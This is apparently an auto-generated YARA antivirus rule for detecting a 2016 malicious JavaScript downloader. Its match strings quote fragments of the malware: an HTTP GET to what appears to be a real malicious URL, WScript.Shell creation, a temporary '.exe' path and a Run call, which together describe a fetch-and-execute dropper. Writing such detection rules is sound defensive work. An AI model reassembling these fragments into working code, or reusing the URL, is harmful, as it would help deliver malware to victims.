rule sig_20160401_a2f98d4cbea587503e1d4b94508ef8cb {
  meta:
    description = "datamaliciousorder - file 20160401_a2f98d4cbea587503e1d4b94508ef8cb.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "195bf6265c494436b0d54ba1e445d962f30a0132e533017b2b84106ad74a6ec4"

  strings:
    $s1  = "MelFcs[DynTf](\"G\" + \"ET\", \"http://hotlinehomeappliances.com/l3ospa\", false);" fullword ascii
    $s2  = "var MfFpl = function CdSyw() {return WScript[AuNir](\"WScript\"+\".Shell\");}(), NznOty = 11;" fullword ascii
    $s3  = "if (MelFcs[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "function WrMyi(){return XerCd + \"\";};" fullword ascii
    $s5  = "function YcLj(RchVuc, CaBjc){TusHe = TusHe * 1; return RchVuc - CaBjc;};" fullword ascii
    $s6  = "function DfMah() {return MfFpl[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"4qVn9eRDpTa.ex\" + \"e\";};" fullword ascii
    $s7  = "function KuXk() {return ((SkqEr == true) && (SkqEr == JhdGo)) ? 1 : TusHe;};" fullword ascii
    $s8  = "var SkqEr = false;" fullword ascii
    $s9  = "function CqrOl(GoTd) {var DgYzw = (1, 2, 3, 4, 5, GoTd); return DgYzw;};" fullword ascii
    $s10 = "function TzgQwx(XsqSh){MfFpl[\"R\"+\"un\"](XsqSh, TusHe, TusHe);};" fullword ascii
    $s11 = "function PiJmj(){return 23;};" fullword ascii
    $s12 = "JhdGo = true; " fullword ascii
    $s13 = "function UlMzk(){return AuNir;};" fullword ascii
    $s14 = "var TewLvf = false;" fullword ascii
    $s15 = "var JhdGo = false;" fullword ascii
    $s16 = "SkqEr = true; " fullword ascii
    $s17 = "var PecLj = new this[\"Date\"]();" fullword ascii
    $s18 = "}while (PlvBw);" fullword ascii
    $s19 = "function PitRg()" fullword ascii
    $s20 = "return YcLj(EbpSz, OhNof);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}